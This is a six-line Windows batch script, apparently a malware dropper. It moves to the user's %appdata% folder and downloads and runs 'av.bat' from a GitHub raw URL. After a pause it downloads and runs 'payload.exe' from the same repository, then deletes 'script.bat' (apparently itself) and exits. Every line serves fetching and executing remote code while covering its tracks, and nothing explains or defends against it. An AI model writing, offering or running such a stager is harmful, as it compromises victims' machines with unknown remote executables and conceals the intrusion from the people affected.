cd %appdata% && curl https://raw.githubusercontent.com/ishanarya24/dc/main/av.bat -O
cmd /c av.bat
timeout 13
cd %appdata% && curl https://raw.githubusercontent.com/ishanarya24/dc/main/payload.exe -O
cmd /c payload.exe
cd %appdata% && DEL script.bat && EXIT
